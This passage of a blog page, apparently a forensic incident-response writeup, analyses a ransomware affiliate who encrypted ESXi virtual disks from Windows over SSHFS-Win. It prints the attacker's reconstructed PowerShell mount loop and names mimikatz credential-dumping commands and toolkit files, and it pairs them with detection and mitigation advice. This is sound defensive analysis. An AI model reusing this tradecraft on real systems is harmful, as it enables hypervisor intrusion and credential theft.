+          <li class="md-nav__item">
+  <a href="#81-rsa-2048-via-statically-linked-mbedtls-no-static-aes" class="md-nav__link">
+    <span class="md-ellipsis">
+      8.1 "RSA-2048 via statically-linked mbedTLS, no static AES"
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#82-the-miner-that-probably-wasnt" class="md-nav__link">
+    <span class="md-ellipsis">
+      8.2 The miner that probably wasn't
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-forensics-under-a-total-event-log-wipe" class="md-nav__link">
+    <span class="md-ellipsis">
+      9. Forensics under a total event-log wipe
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-attribution-commodity-kit-one-verified-hash-one-unique-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      10. Attribution: commodity kit, one verified hash, one unique file
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="10. Attribution: commodity kit, one verified hash, one unique file">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#101-the-encryption-geometry-is-the-discriminator" class="md-nav__link">
+    <span class="md-ellipsis">
+      10.1 The encryption geometry is the discriminator
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#102-a-named-public-campaign-matches" class="md-nav__link">
+    <span class="md-ellipsis">
+      10.2 A named public campaign matches
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#103-one-file-in-the-kit-is-unique" class="md-nav__link">
+    <span class="md-ellipsis">
+      10.3 One file in the kit is unique
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-what-could-not-be-answered-and-where-the-answers-live" class="md-nav__link">
+    <span class="md-ellipsis">
+      11. What could not be answered, and where the answers live
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      12. Takeaways
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../message-from-sts.gov.kz/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Message from sts.gov.kz
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../email-dating-relationship-scam/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Apparently, I have been on a dating site... lol
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../finding-a-scammer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Как меня пытались развести, но что-то пошло не так...
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Draft
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Draft
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../my-experience-of-taking-medications/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    My experience of taking medications and some side effects and notes about Vortioxetine (Brintellix, Trintellix, Fonksera), Lamotrigine (Lamictal) and Olanzapine (Ferzapine)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../about/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    About
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-the-environment-in-the-abstract" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. The environment, in the abstract
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-the-technique-sshfs-win-as-a-ransomware-transport" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. The technique: SSHFS-Win as a ransomware transport
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. The technique: SSHFS-Win as a ransomware transport">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-what-the-hypervisors-saw" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.1 What the hypervisors saw
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-the-prerequisites-were-mundane" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.2 The prerequisites were mundane
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#23-it-broke-and-the-breakage-is-visible-in-the-ciphertext" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.3 It broke, and the breakage is visible in the ciphertext
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#24-mitigations-this-specifically-argues-for" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.4 Mitigations this specifically argues for
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#25-attribution-fingerprint" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.5 Attribution fingerprint
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-the-toolkit-121-files-in-three-two-letter-folders" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. The toolkit: 121 files in three two-letter folders
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. The toolkit: 121 files in three two-letter folders">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31-mi-credential-dumping" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.1 mi\ — credential dumping
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32-ns-scanning-persistence-remote-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.2 ns\ — scanning, persistence, remote access
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.2 ns\ — scanning, persistence, remote access">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-one-bespoke-component" class="md-nav__link">
+    <span class="md-ellipsis">
+      The one bespoke component
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#33-e-the-loader" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.3 e\ — the loader
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-the-seventeen-hour-shift" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. The seventeen-hour shift
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. The seventeen-hour shift">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-two-encryptors-not-one" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.1 Two encryptors, not one
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-the-exfiltration-shaped-hole" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.2 The exfiltration-shaped hole
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-persistence-two-ifeo-hijacks-with-two-different-jobs" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Persistence: two IFEO hijacks with two different jobs
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-anti-forensics-seven-scripts-in-76-milliseconds" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Anti-forensics: seven scripts in 76 milliseconds
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Anti-forensics: seven scripts in 76 milliseconds">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#61-timestomping-and-the-artefact-that-defeats-it" class="md-nav__link">
+    <span class="md-ellipsis">
+      6.1 Timestomping, and the artefact that defeats it
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-the-payload-85-mib-of-ciphertext-against-2187-tb" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. The payload: 85 MiB of ciphertext against 21.87 TB
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7. The payload: 85 MiB of ciphertext against 21.87 TB">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#71-what-25-mib-at-each-end-actually-destroys" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.1 What 2.5 MiB at each end actually destroys
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#72-why-97-came-back-anyway" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.2 Why 97 % came back anyway
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#73-the-trailer" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.3 The trailer
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#74-the-second-recovery-frontier-every-small-file-is-half-plaintext" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.4 The second recovery frontier: every small file is half plaintext
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#75-measuring-a-cipher-you-do-not-have" class="md-nav__link">
+    <span class="md-ellipsis">
+      7.5 Measuring a cipher you do not have
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-two-claims-that-did-not-survive-the-evidence" class="md-nav__link">
+    <span class="md-ellipsis">
+      8. Two claims that did not survive the evidence
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="8. Two claims that did not survive the evidence">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#81-rsa-2048-via-statically-linked-mbedtls-no-static-aes" class="md-nav__link">
+    <span class="md-ellipsis">
+      8.1 "RSA-2048 via statically-linked mbedTLS, no static AES"
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#82-the-miner-that-probably-wasnt" class="md-nav__link">
+    <span class="md-ellipsis">
+      8.2 The miner that probably wasn't
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-forensics-under-a-total-event-log-wipe" class="md-nav__link">
+    <span class="md-ellipsis">
+      9. Forensics under a total event-log wipe
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-attribution-commodity-kit-one-verified-hash-one-unique-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      10. Attribution: commodity kit, one verified hash, one unique file
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="10. Attribution: commodity kit, one verified hash, one unique file">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#101-the-encryption-geometry-is-the-discriminator" class="md-nav__link">
+    <span class="md-ellipsis">
+      10.1 The encryption geometry is the discriminator
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#102-a-named-public-campaign-matches" class="md-nav__link">
+    <span class="md-ellipsis">
+      10.2 A named public campaign matches
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#103-one-file-in-the-kit-is-unique" class="md-nav__link">
+    <span class="md-ellipsis">
+      10.3 One file in the kit is unique
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-what-could-not-be-answered-and-where-the-answers-live" class="md-nav__link">
+    <span class="md-ellipsis">
+      11. What could not be answered, and where the answers live
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      12. Takeaways
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+  <h1>Encrypting an ESXi estate without ever running code on ESXi</h1>
+  <p class="post-meta">
+  <p class="text-muted">Published Aug 11, 2026
+    by Zhymabek Roman
+  </p>
+  </p>
+  
+  
+  <p>A GlobeImposter affiliate encrypted 34 virtual machine disks — 21.87 TB — across an eleven-host ESXi estate in a single evening. They never ran a single line of code on a hypervisor. No <code>esxcli</code>, no Linux ELF encryptor, no Python script dropped into <code>/tmp</code>, no <code>vim-cmd vmsvc/power.off</code> loop. The entire ESXi-ransomware detection playbook that the industry built between 2021 and 2024 would have caught precisely nothing.</p>
+<p>Instead they harvested ESXi root credentials from a browser password store, mounted all eleven VMFS datastores as <strong>Windows drive letters</strong> over SSHFS-Win, and ran one 54 KB Windows encryptor across every mount at once.</p>
+<p>From the hypervisors' point of view, this was an authenticated root SSH session performing SFTP writes. Which is what an administrator moving files looks like.</p>
+<p>This post is a writeup of the forensic reconstruction: the technique, the toolkit, the seventeen-hour operator shift rebuilt second-by-second from artefacts that survived a deliberate seven-script wipe, why 97 % of the data came back without paying, and — the part I care most about — the claims I had to retract along the way and the analytical traps that produced them.</p>
+<p>Everything identifying is removed: organisation, hosts, accounts, credentials, campaign identifiers, operator contact addresses. Internal addresses appear as <code>&lt;esxi-01&gt;</code>-style placeholders. What is left is tradecraft, artefact behaviour, and method.</p>
+<div class="admonition abstract">
+<p class="admonition-title">TL;DR</p>
+<ul>
+<li><strong>Technique:</strong> ESXi datastores mounted as Windows drive letters via SSHFS-Win + WinFsp; one Windows encryptor walked eleven mounts. Zero hypervisor-side execution.</li>
+<li><strong>Damage:</strong> 85 MiB of ciphertext against 21.87 TB of virtual disks. 0.0004 % of bytes destroyed.</li>
+<li><strong>Recovery:</strong> 33 of 34 disks (97 %) recovered <em>without the key</em>, from backup GPT headers, ext4 backup superblocks and NTFS backup boot sectors that all sit outside the malware's fixed blast radius.</li>
+<li><strong>Bonus recovery:</strong> ~50 % of every small encrypted file survives as plaintext. A browser's encrypted master-key store yielded all 40 stored credentials.</li>
+<li><strong>Forensics:</strong> event logs were annihilated (137 channels cleared, Event Log service deleted). USN, MFT <code>SI</code>-vs-<code>FN</code>, RDP bitmap cache, UserAssist, Amcache and PCA reconstructed the session anyway.</li>
+<li><strong>Anti-lesson:</strong> runlist-based file recovery on a thin-provisioned TRIM volume produces <em>convincing false positives</em>. One nearly became a published IOC.</li>
+</ul>
+</div>
+<hr/>
+<h2 id="1-the-environment-in-the-abstract">1. The environment, in the abstract</h2>
+<p>One Windows backup server. Eleven ESXi hosts across two internal /24s. 34 flat VMDKs totalling 21.87 TB. A vCenter. A domain controller. An application server. Standard mid-size estate.</p>
+<p>The backup server is the important character here, and not because it holds backups. It holds:</p>
+<ul>
+<li><strong>install rights</strong> and a logged-in administrator profile,</li>
+<li><strong>network reach to every hypervisor</strong> by design,</li>
+<li>a backup product whose configuration database stores <strong>decryptable credentials for everything it has ever authenticated against</strong> — vCenter, ESXi root, guest-OS accounts used for application-aware processing, SQL, cloud repositories,</li>
+<li>and, in this case, a browser with 40 saved passwords, because it doubled as somebody's workstation.</li>
+</ul>
+<p>It also doubled as somebody's <em>personal</em> workstation: a torrent client with 43 GiB of lifetime traffic, cracked software from a well-known warez portal, a cracked licence for the backup product itself, and a WinPE rescue toolkit from a Russian tracker. That is the leading hypothesis for initial access. It is not proven, and I will come back to why I refuse to state it as fact.</p>
+<hr/>
+<h2 id="2-the-technique-sshfs-win-as-a-ransomware-transport">2. The technique: SSHFS-Win as a ransomware transport</h2>
+<p>At 11:47 on the attack day the operator installed two MSIs: <strong>WinFsp</strong> (a FUSE-alike user-space filesystem driver for Windows) and <strong>SSHFS-Win</strong> (an SFTP client that presents a remote path as a Windows filesystem). Both are legitimate, signed, widely used open-source software.</p>
+<p>Ten hours later, at 21:09:13, a PowerShell script was written to disk. <strong>2.6 seconds later</strong> the first mount registered. Eleven mounts came up roughly one second apart, finishing at 21:09:26.</p>
+<p>The script was reconstructed from RDP bitmap-cache tiles — partial visibility, key lines legible:</p>
+<pre><code class="language-powershell">$login = "root"
+$password = "&lt;harvested&gt;"
+$ips = Get-Content "ip.txt"
+foreach ($ip in $ips) {
+    $path = "\\sshfs\root@$ip\vmfs"
+    $letter = (65..90 | Where-Object { -not (Get-PSDrive -Name ([char]$_) -EA 0) })[0]
+    net use "$([char]$letter):" $path /user:$login $password
+}
+</code></pre>
+<p>Twelve lines. <code>ip.txt</code> was exactly 158 bytes — eleven addresses, one per line.</p>
+<p>That reconstruction was later confirmed against a <strong>primary source</strong>: <code>HKCU\Network</code>, which the kernel writes at connect time and which nobody thinks to wipe.</p>
+<table>
+<thead>
+<tr>
+<th>Drive</th>
+<th>RemotePath</th>
+<th>Key lastwrite (UTC)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>A:</code></td>
+<td><code>\\sshfs\root@&lt;esxi-01&gt;\vmfs</code></td>
+<td>21:09:17</td>
+</tr>
+<tr>
+<td><code>B:</code></td>
+<td><code>\\sshfs\root@&lt;esxi-02&gt;\vmfs</code></td>
+<td>21:09:18</td>
+</tr>
+<tr>
+<td><code>H:</code></td>
+<td><code>\\sshfs\root@&lt;esxi-03&gt;\vmfs</code></td>
+<td>21:09:18</td>
+</tr>
+<tr>
+<td><code>I:</code></td>
+<td><code>\\sshfs\root@&lt;esxi-04&gt;\vmfs</code></td>
+<td>21:09:20</td>
+</tr>
+<tr>
+<td><code>J:</code></td>
+<td><code>\\sshfs\root@&lt;esxi-05&gt;\vmfs</code></td>
+<td>21:09:21</td>
+</tr>
+<tr>
+<td><code>K:</code></td>
+<td><code>\\sshfs\root@&lt;esxi-06&gt;\vmfs</code></td>
+<td>21:09:22</td>
+</tr>
+<tr>
+<td><code>L:</code></td>
+<td><code>\\sshfs\root@&lt;esxi-07&gt;\vmfs</code></td>
+<td>21:09:23</td>
+</tr>
+<tr>
+<td><code>M:</code></td>
+<td><code>\\sshfs\root@&lt;esxi-08&gt;\vmfs</code></td>
+<td>21:09:24</td>
+</tr>
+<tr>
+<td><code>N:</code></td>
+<td><code>\\sshfs\root@&lt;esxi-09&gt;\vmfs</code></td>
+<td>21:09:24</td>
+</tr>
+<tr>
+<td><code>O:</code></td>
+<td><code>\\sshfs\root@&lt;esxi-10&gt;\vmfs</code></td>
+<td>21:09:25</td>
+</tr>
+<tr>
+<td><code>P:</code></td>
+<td><code>\\sshfs\root@&lt;esxi-11&gt;\vmfs</code></td>
+<td>21:09:26</td>
+</tr>
+</tbody>
+</table>
+<p>Every entry carries <code>UserName = root</code> and <code>ProviderName = Windows File System Proxy</code> — WinFsp's provider string. That is the mechanism confirmed from the kernel's own bookkeeping rather than from squinting at 64×64 pixel tiles.</p>
+<p>Two of the letter mappings I had originally read off the bitmap cache were <strong>wrong</strong> — off by one host each. The registry corrected them. But notice what the corrected allocation is: <code>A B H I J K L M N O P</code>. C through G were already in use on that machine. That is <em>exactly</em> what the free-drive-letter loop in the reconstructed script predicts, and the script came from an independent artefact. When a reconstruction's logic predicts an observation made from a different source, the reconstruction is structurally right even where individual details were misread. That is worth more than either artefact alone.</p>
+<p>Encryption across the eleven mounts ran <strong>21:20–21:26</strong> as a single Windows process walking drive letters.</p>
+<h3 id="21-what-the-hypervisors-saw">2.1 What the hypervisors saw</h3>
+<p>Nothing worth an alert.</p>
+<ul>
+<li>No ransomware process on ESXi. Nothing in hypervisor telemetry to detect, because nothing hypervisor-side executed.</li>
+<li>The encryption load presents as <strong>an outbound SSH/SFTP session from a legitimate management host to each hypervisor</strong>, authenticating as root with valid credentials.</li>
+<li>No <code>esxcli</code> invocations. No shell scripts. No unknown binaries staged in <code>/tmp</code> or <code>/vmfs/volumes</code>. No VM power-off loop — the classic ESXi-encryptor tell, since most families must stop VMs to get exclusive access to their disks. This one did not bother: intermittent encryption of a running VM's flat VMDK works fine when you only intend to destroy 2.5 MiB of it.</li>
+<li>Modern ESXi does not log SSH source addresses the way older versions did, so even the surviving hypervisor auth logs are thin.</li>
+</ul>
+<p>The detection surface, such as it is, is on the Windows side and in the network:</p>
+<ol>
+<li><strong>WinFsp / SSHFS-Win driver and service installation</strong> on a server. A backup server has no legitimate reason to mount VMFS over SFTP. This is a high-signal, low-noise EDR rule and almost nobody has it.</li>
+<li><strong><code>net use</code> mapping a <code>\\sshfs\...</code> UNC path.</strong> The provider string <code>Windows File System Proxy</code> in <code>HKCU\Network</code> is equally distinctive.</li>
+<li><strong>Volume and duration of SFTP writes</strong> from one host to every hypervisor simultaneously, at 21:20 on a Sunday.</li>
+</ol>
+<h3 id="22-the-prerequisites-were-mundane">2.2 The prerequisites were mundane</h3>
+<ol>
+<li><strong>ESXi root credentials for all eleven hosts.</strong> Obtained that morning in an eight-minute window (05:17–05:25) by browsing to each host's web UI and letting the browser's password manager offer the saved credential. The password family was shared across vCenter, every ESXi host, the routers and the cloud tenant. The browser password store <em>was</em> the estate.</li>
+<li><strong>Install permission on a Windows host with reach.</strong> The operator had the administrator account.</li>
+<li><strong>SSH enabled on every hypervisor.</strong> It was. It still was, long after the incident, on every host that was checked.</li>
+</ol>
+<h3 id="23-it-broke-and-the-breakage-is-visible-in-the-ciphertext">2.3 It broke, and the breakage is visible in the ciphertext</h3>
+<p>At <strong>21:27:37.923</strong> <code>sshfs.exe</code> crashed, writing an <code>sshfs.exe.stackdump</code> next to itself. Cygwin-based SSHFS is not built for eleven concurrent SSH channels under sustained high-fanout write load. When it died, the mounts went away mid-run.</p>
+<p>The operator noticed and re-ran the encryptor eleven minutes later. That is not an inference from behaviour — it is legible in the ciphertext itself. Every encrypted image carries an appended trailer, and the trailers hash into exactly two groups:</p>
+<table>
+<thead>
+<tr>
+<th>Blob</th>
+<th>Images</th>
+<th>Which run</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>A</td>
+<td>29</td>
+<td>first pass, before the crash</td>
+</tr>
+<tr>
+<td>B</td>
+<td>5</td>
+<td>second pass, after the crash, on whatever was still mountable</td>
+</tr>
+</tbody>
+</table>
+<p>Two blobs, two encryption events, one crash between them. The malware documented the operator's operational failure for us.</p>
+<h3 id="24-mitigations-this-specifically-argues-for">2.4 Mitigations this specifically argues for</h3>
+<ul>
+<li>ESXi SSH <strong>disabled by default</strong>, enabled only inside time-boxed maintenance automation. It is the single control that would have stopped this cold.</li>
+<li><strong>Lockdown Mode</strong> for root access.</li>
+<li><strong>Key + FIDO2</strong> authentication rather than one shared root password across eleven hosts.</li>
+<li><strong>EDR rules for WinFsp/SSHFS-Win</strong> installation and for <code>\\sshfs\</code> UNC mounts on Windows management hosts.</li>
+<li>Treat the <strong>backup server as tier-0</strong>. It is not a file server that happens to hold copies; it is a credential vault with network reach to every hypervisor and guest in the estate.</li>
+</ul>
+<h3 id="25-attribution-fingerprint">2.5 Attribution fingerprint</h3>
+<p>SSHFS-Win + WinFsp + <code>\\sshfs\root@&lt;ip&gt;\vmfs</code> + GlobeImposter is a distinctive tradecraft combination. As of this engagement I could not find it documented in any public affiliate profile for GlobeImposter or for the Phobos-family operators whose kit this affiliate otherwise uses verbatim. If you have seen this pattern in another engagement, that is a linkage worth making.</p>
+<hr/>
+<h2 id="3-the-toolkit-121-files-in-three-two-letter-folders">3. The toolkit: 121 files in three two-letter folders</h2>
+<p>The kit landed in the administrator's <code>Music\</code> folder in <strong>53 seconds</strong> (04:27:36–04:28:29). 121 files, three subfolders, each named with two letters or one:</p>
+<ul>
+<li><strong><code>mi\</code></strong> — mimikatz and credential dumpers</li>
+<li><strong><code>ns\</code></strong> — network scanner, persistence, remote access, backup-product-specific tooling</li>
+<li><strong><code>e\</code></strong> — executor / loader</li>
+</ul>
+<p>The naming is not obfuscation, it is ergonomics: short folder names keep the relative paths inside the batch scripts short. Every script references its siblings relatively — <code>..\mi\mimikatz\x64\mimikatz.exe</code>, <code>..\e\ip.txt</code> — so the kit drops as a unit into any user-writable directory and works without modification. It is a <em>portable, path-independent</em> toolkit. That design detail tells you this operator does this often.</p>
+<h3 id="31-mi-credential-dumping">3.1 <code>mi\</code> — credential dumping</h3>
+<p>35 files. Reconstructed from the USN journal (which caught every CREATE between 04:28:18 and 04:28:29) and from MFT records that survived the toolkit being sent to the Recycle Bin at 21:19.</p>
+<pre><code>mi\
+├── 0.start.bat                      3,291 B   entry-point wrapper
+├── 1.Automim.bat                    4,114 B   automated mimikatz launcher
+├── 3.Install_MimPassHunter.bat        484 B
+├── 3.ViewPassMimLsa.bat               716 B
+├── CredentialsFileView.exe        116,944 B   NirSoft — Credential Manager / DPAPI reader
+├── CredentialsFileView64.exe      155,856 B
+├── CredentialsFileView64.cfg          482 B   ← config mtime = when the tool RAN
+├── PassMimLsa.txt                      18 B   output, near-empty at recycle time
+├── WebBrowserPassView.exe         462,336 B   ← this is what took the 40 browser credentials
+├── credentialsfileview-x64\ …
+└── mimikatz\
+    ├── kiwi_passwords.yar           2,834 B
+    ├── miparser.vbs                 5,172 B
+    ├── x32\ {mimidrv.sys, mimikatz.exe, mimilib.dll, mimilove.exe, mimispool.dll}
+    └── x64\
+        ├── mimikatz.exe         1,355,264 B
+        ├── mimidrv.sys             37,208 B   signed kernel driver
+        ├── mimikatz.log               162 B   ← the smoking gun
+        ├── CMDAsAdmin.bat             421 B
+        └── mimstart.bat                30 B
+</code></pre>
+<p><strong><code>mimikatz.log</code>, 162 bytes, mtime 04:28:27.</strong> A log file exists only if the binary ran. 162 bytes is about the size of a banner plus one command sequence — consistent with a scripted single-shot <code>sekurlsa::logonpasswords</code> or <code>lsadump::sam</code> fired from <code>1.Automim.bat</code>. Mimikatz was <strong>executed</strong>, not merely staged, within a minute of the kit landing.</p>
+<p>The output went to files named <code>NTLM.txt</code> and <code>Result.txt</code>. Neither survives on disk — but both were caught <strong>open in Notepad</strong> in the RDP bitmap cache later that evening. So we know the dump succeeded, we know the operator read it, and we cannot read it ourselves.</p>
+<p>This matters for scoping. The 40 browser credentials that <em>were</em> recovered are only what <code>WebBrowserPassView.exe</code> produced. The mimikatz and Credential-Manager output is a <strong>separate, larger, unrecovered credential trove</strong>. Rotation planning has to assume the superset.</p>
+<h3 id="32-ns-scanning-persistence-remote-access">3.2 <code>ns\</code> — scanning, persistence, remote access</h3>
+<p>28 files plus a full Process Hacker distribution. The interesting ones:</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Size</th>
+<th>Note</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>netscan.exe</code></td>
+<td>11.2 MB</td>
+<td>SoftPerfect Network Scanner, portable</td>
+</tr>
+<tr>
+<td><code>netscan.lic</code></td>
+<td>832 B</td>
+<td><strong>licence refreshed two weeks before the attack</strong></td>
+</tr>
+<tr>
+<td><code>netscan.xml</code></td>
+<td>122 KB</td>
+<td>saved scan profiles and prior results</td>
+</tr>
+<tr>
+<td><code>oui.txt</code></td>
+<td>1.2 MB</td>
+<td>MAC vendor DB — they brought the offline lookup tables</td>
+</tr>
+<tr>
+<td><code>GeoLite2-Country.mmdb</code></td>
+<td>3.9 MB</td>
+<td>MaxMind geoIP DB, same reason</td>
+</tr>
+<tr>
+<td><code>PsExec.exe</code></td>
+<td>339 KB</td>
+<td>lateral execution over 445/135</td>
+</tr>
+<tr>
+<td><code>AnyDesk.exe</code></td>
+<td>4.0 MB</td>
+<td>unattended remote access — <strong>staged, never run</strong></td>
+</tr>
+<tr>
+<td><code>cmd_pass.exe</code></td>
+<td>313 KB</td>
+<td>executed 04:31:12</td>
+</tr>
+<tr>
+<td><code>RpcSsv.exe</code></td>
+<td>45 KB</td>
+<td>service masquerade — the name mimics <code>RpcSs</code></td>
+</tr>
+<tr>
+<td><code>fndr.vbs</code></td>
+<td>23.8 KB</td>
+<td>file finder / recon</td>
+</tr>
+<tr>
+<td><code>wallfnd.vbs</code></td>
+<td>6.0 KB</td>
+<td><strong>wallet-file finder</strong></td>
+</tr>
+<tr>
+<td><code>InstallNetCat.vbs</code></td>
+<td>2.4 KB</td>
